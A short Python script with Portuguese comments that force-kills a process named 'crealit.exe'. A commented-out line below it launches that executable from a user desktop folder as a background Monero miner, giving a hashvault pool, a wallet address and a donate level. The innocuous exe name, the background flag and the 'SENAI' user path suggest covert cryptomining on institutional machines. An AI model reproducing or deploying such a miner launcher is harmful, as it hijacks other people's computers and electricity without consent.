import subprocess

def matar_processo(nome_processo="crealit.exe"):
    """
    Encerra todos os processos com o nome especificado.
    Por padrão, encerra 'crealit.exe'.
    """
    try:
        subprocess.run(
            ["taskkill", "/f", "/im", nome_processo],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False
        )
    except Exception as e:
        print(f"Erro ao tentar matar o processo {nome_processo}: {e}")

matar_processo()  # Encerra 'crealit.exe'

#subprocess.Popen(f'cmd /c start "" "C:\\Users\\SENAI\\Desktop\\dcreamit\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p teste --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
